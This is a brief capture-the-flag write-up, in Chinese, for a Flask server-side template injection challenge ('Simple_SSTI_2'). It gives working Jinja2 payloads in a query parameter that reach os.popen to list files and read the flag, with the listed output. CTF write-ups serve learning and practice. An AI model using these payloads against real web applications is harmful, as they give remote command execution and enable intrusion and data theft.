# Simple_SSTI_2

## writeup

flask模板注入

```
?flag={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}    # Dockerfile app.py flag gunicorn.conf.py templates 

?flag={{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
```

PS: 不能用os.system()，因为永远返回0